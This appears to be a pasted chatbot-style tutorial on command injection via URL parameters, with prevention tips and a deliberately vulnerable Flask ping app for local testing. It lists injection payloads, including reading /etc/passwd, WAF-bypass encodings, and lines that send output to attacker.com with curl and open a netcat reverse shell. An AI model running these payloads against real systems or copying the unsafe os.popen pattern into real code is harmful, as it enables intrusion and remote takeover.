@@ -1,0 +1,106 @@
+Command Injection via URL Parameters?
+Command injection happens when user input (like URL parameters) is used unsafely in a system command (e.g., via system(), exec(), popen(), etc.) on the backend.
+
+For example, let’s say a URL like this:
+
+arduino
+Copy
+Edit
+http://example.com/ping?host=8.8.8.8
+gets used like this in the backend (insecure!):
+
+bash
+Copy
+Edit
+ping -c 4 $host
+If the parameter isn’t sanitized, you can inject extra commands:
+
+bash
+Copy
+Edit
+http://example.com/ping?host=8.8.8.8; whoami
+💣 Common Command Injection Payloads
+🔹 Basic Test Payloads
+bash
+Copy
+Edit
+; whoami
+| whoami
+&& whoami
+`whoami`
+🔹 Multiple Commands
+bash
+Copy
+Edit
+127.0.0.1; ls -la
+127.0.0.1 && uname -a
+127.0.0.1 || echo test
+127.0.0.1 | cat /etc/passwd
+🔹 Using Backticks
+bash
+Copy
+Edit
+127.0.0.1`id`
+127.0.0.1`ls`
+🔹 Chaining and Redirection
+bash
+Copy
+Edit
+127.0.0.1; curl http://attacker.com?`whoami`
+127.0.0.1; nc attacker.com 4444 -e /bin/sh
+📦 Encoded/Obfuscated Payloads
+For bypassing WAFs or filters:
+
+bash
+Copy
+Edit
+%3Bwhoami        # ;whoami
+%26%26id         # &&id
+%7Cuname%20-a    # |uname -a
+🔧 Detection Tips
+Try sending:
+
+bash
+Copy
+Edit
+; sleep 5
+&& sleep 5
+If the response is delayed by 5 seconds, it's likely vulnerable.
+
+Observe system behavior — output in response, delay, or errors.
+
+🔒 How to Prevent Command Injection
+Never directly pass user input to shell commands
+
+Use safe APIs that don’t involve the shell (e.g., subprocess.run([...], shell=False) in Python)
+
+Sanitize input and allow only expected values (e.g., regex for IP addresses)
+
+Use whitelisting, not blacklisting
+
+Consider container isolation for command execution environments
+
+🧪 Want to Test It?
+You can spin up a local example like this (in Python):
+
+python
+Copy
+Edit
+from flask import Flask, request
+import os
+
+app = Flask(__name__)
+
+@app.route('/ping')
+def ping():
+    host = request.args.get('host')
+    result = os.popen(f"ping -c 1 {host}").read()
+    return f"<pre>{result}</pre>"
+
+app.run()
+Now try:
+
+bash
+Copy
+Edit
+http://localhost:5000/ping?host=127.0.0.1;whoami
